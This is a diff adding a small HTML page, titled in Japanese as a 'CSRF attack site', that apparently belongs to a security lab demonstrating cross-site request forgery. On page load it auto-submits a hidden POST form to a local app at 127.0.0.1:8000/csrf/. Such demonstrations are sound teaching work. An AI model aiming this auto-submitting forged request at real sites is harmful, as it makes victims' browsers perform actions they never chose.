@@ -1,0 +1,14 @@
+<html lang="ja">
+<head>
+    <title>CSRF攻撃サイト</title>
+    <meta charset="UTF-8">
+</head>
+<body onload="document.attackform.submit();">
+    <p>攻撃対象のアプリケーションを http://127.0.0.1:8000 で実行していて下さい。</p>
+
+    <form name="attackform" action="http://127.0.0.1:8000/csrf/" method="post">
+        <input type="text" name="content" value="THIS IS CSRF ATTACK!!!">
+        <button type="submit">投稿</button>
+    </form>
+</body>
+</html>
